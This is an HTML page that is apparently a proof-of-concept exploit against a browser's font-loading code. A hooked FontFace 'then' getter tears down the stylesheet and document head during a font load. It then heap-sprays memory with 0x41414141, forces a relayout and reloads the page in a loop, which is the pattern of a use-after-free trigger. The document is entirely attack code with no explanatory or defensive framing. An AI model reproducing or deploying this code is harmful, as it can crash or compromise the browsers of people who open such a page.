<!DOCTYPE html>
<html>
<head>
<style id="s">
@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
</style>
</head>
<body>
<script>
window.onload = () => {
    const fonts = [];
    for(let i=0; i<50; i++) {
        let f = new FontFace('font-' + i, 'local(Arial)');
        document.fonts.add(f);
        fonts.push(f);
    }

    let target = new FontFace('x', 'local(Arial)', { unicodeRange: 'U+0041' });
    document.fonts.add(target);

    let fired = false;
    
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            if (!fired && this === target) {
                fired = true;

                document.getElementById('s').textContent = ""; 
                document.head.innerHTML = ""; 

                this.spray = [];
                for(let i=0; i<2000; i++) {
                    let buffer = new Uint32Array(1024);
                    for(let j=0; j<buffer.length; j++) buffer[j] = 0x41414141;
                    this.spray.push(buffer);
                }

                document.body.style.display = 'none';
                document.body.offsetTop; 
                document.body.style.display = 'block';
            }
            return undefined;
        }
    });

    try {
        document.fonts.load('1em x', 'A').catch(e => {});
        target.load();
    } catch(e) {}

    setTimeout(() => {
        location.reload();
    }, 100);
};
</script>
</body>
</html>
